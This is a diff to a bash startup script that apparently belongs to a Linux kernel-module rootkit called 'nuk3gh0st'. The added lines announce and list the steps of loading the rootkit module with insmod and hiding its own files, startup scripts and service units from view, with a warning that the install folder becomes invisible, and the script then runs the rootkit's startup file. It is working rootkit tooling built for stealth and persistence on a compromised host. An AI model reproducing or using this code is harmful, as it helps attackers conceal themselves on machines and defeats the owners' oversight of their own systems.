@@ -14,5 +14,32 @@ function print_banner {
   echo ""
 }
 
+function print_load_rootkit {
+	echo -e "${item} Loading nuk3gh0st LKM rootkit"
+	echo -e "   ${purple} cmd: insmod /usr/share/nuk3gh0st/rootkit.ko${endColor}"
+	echo ""
+}
+
+function print_hide_rootkit_files {
+	echo -e "${item} Hidding nuk3gh0st files"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rootkit.ko${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=load-nuk3gh0st${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=unload-nuk3gh0st${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=startup-nuk3gh0st${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=rmstartup-nuk3gh0st${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.startup${endColor}"
+        echo -e "   ${purple} cmd: nuk3gh0st --hide-file=nuk3gh0st.service${endColor}"
+	echo -e "   ${purple} cmd: nuk3gh0st --hide-file=S99nuk3gh0st.startup${endColor}"
+        echo ""
+
+        echo -e "${yellow}WARNING: you won't be able to see the installation folder"
+        echo -e "until you unload the rootkit, but it will still exist "
+        echo -e "and you can access to it if you remember the path${endColor}"
+        echo ""
+}
+
 print_banner
+print_load_rootkit
+print_hide_rootkit_files
 bash /usr/share/nuk3gh0st/nuk3gh0st.startup
